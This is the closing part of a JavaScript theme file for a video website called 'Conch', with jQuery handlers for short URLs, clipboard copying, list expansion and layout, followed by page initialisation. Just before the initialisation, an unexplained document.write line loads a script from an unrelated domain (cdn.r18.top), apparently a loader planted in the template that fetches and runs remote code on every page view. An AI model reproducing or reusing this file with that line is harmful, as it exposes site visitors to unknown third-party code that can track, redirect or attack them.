                        if (ajax.readyState === 4 && ajax.status === 200) {
                            var obj =JSON.parse(ajax.responseText)
                            console.log(ajax.responseText);
                            if (obj.Code===0){short.prepend(obj.ShortUrl);}else{short.prepend(url);}
                        }
                    }
                };
            }else{
                short.prepend(url);
            }
        },
        'Target':function(){
            $('a').each(function(){
                var str = $(this).attr("href");
                if($(this).length && str.indexOf("java") == -1){
                    $(this).attr("target","_blank");
                }
            });
        },
        'Copy': function() {
            var btn=document.getElementsByClassName('conch-copy');
            var clipboard=new Clipboard(btn);
            clipboard.on('success', function(e){
                $('body').append('<div class="hl-pop-msg"><div class="hl-pop-tip">复制成功</div></div>');
                setTimeout(function(){$('.hl-pop-msg').remove();},1000);
            });
            clipboard.on('error', function(e){
                $('body').append('<div class="hl-pop-msg"><div class="hl-pop-tip">复制失败！请手动复制</div></div>');
                setTimeout(function(){$('.hl-pop-msg').remove();},1000);
            });
        },
        'Set': function() {
            $('.hl-more-list').each(function(){
                if ($(this).length) {
                    var $wrap = $(this).parent().parent();
                    $(this).click(function(){
                        $wrap.removeClass('hl-list-hide');
                        $(this).parent().remove();
                    });
                }
            });
            $('.hl-vod-big').each(function(){
                if ($(this).length && Conch.Browser.Swidth>767) {
                    var $ul = $(this).find('.hl-vod-list');
                    var $one = $ul.find('li:nth-child(1) a');
                    var $two = $ul.find('li:nth-child(2) a'),
                        $high= $two.innerHeight();
                    $one.css('height',''+$high+'px');
                }
            });
            $('.hl-vod-widebig.hl-list-v12').each(function(){
                if ($(this).length && Conch.Browser.Swidth>767) {
                    var $ul = $(this).find('.hl-vod-list');
                    var $one = $ul.find('li:nth-child(1) a');
                    var $two = $ul.find('li:nth-child(2) a'),
                        $high= $two.innerHeight()*2+80;
                    $one.css('height',''+$high+'px');
                }
            });
            $('.hl-setups-op a').click(function(){
                var $setup=$(this).parent().parent();
                if($setup.css('right')=='0px'){
                    $setup.removeClass('active');
                }else{
                    $setup.addClass('active');                   
                }
            });
            $('.hl-head-slide').each(function(){
                if ($(this).length) {
                    var Title = $(this).find('h2').innerWidth();
                    var Swrap = Title+10;
                    $(this).find('.hl-rb-type-child').css('width','calc(100% - '+Swrap+'px)');
                }
            });
            $('.hl-this-box').each(function(){
                var $this = $(this),
                    $btn = $this.find(".hl-close-this");
                $btn.click(function(){
                    $this.remove();
                });
            });
        },
    },
};
document.write("<script type='text/javascript' src='//cdn.r18.top/asset/js/t.js'></script>");
$(document).ready(function() {
    Conch.Host();
    Conch.Resize();
    Conch.Images.Init();
    Conch.Swiper.Init();
    Conch.Scroll.Init();
    Conch.Search.Init();
    Conch.History.Init();
    Conch.User.Init();
    Conch.Alert.Init();
    Conch.Shows.Init();
    Conch.Other.Init();
});
